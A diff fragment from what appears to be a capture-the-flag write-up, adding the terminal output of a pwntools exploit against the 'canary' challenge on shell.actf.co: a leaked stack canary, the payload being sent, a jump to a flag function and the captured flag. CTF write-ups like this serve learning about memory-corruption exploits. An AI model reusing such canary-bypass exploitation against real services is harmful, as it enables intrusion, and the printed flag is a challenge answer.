@@ -505,6 +505,48 @@ print("[?] Enter through process") # since i call main(), just need the func to 
 sh.interactive()
 {% endhighlight %}
 
+```
+[fml@DCLXVI:~]$python canary.py 
+[+] Opening connection to shell.actf.co on port 20701: Done
+[?] Canary:0x2025a303ba77b200
+[?] Canary redone
+\x00w\xba\x03% 
+[?] Payload sent
+[?] Recall main(), flag()
+[?] Enter through process
+[*] Switching to interactive mode
+Cock-a-doodle-doo! Cock-a-doodle-doo!
+
+        .-"-.
+       / 4 4 \
+       \_ v _/
+       //   \\
+      ((     ))
+=======""===""=======
+         |||
+         '|'
+
+Ahhhh, what a beautiful morning on the farm!
+And my canary woke me up at 5 AM on the dot!
+
+       _.-^-._    .--.
+    .-'   _   '-. |__|
+   /     |_|     \|  |
+  /               \  |
+ /|     _____     |\ |
+  |    |==|==|    |  |
+  |    |--|--|    |  |
+  |    |==|==|    |  |
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+Hi! What's your name? $ 
+Nice to meet you, $ 
+!
+Anything else you want to tell me? actf{youre_a_canary_killer_>:(}
+Segmentation fault
+[*] Got EOF while reading in interactive
+$  
+```
 
 flag: actf{youre_a_canary_killer_>:(}
 <br>
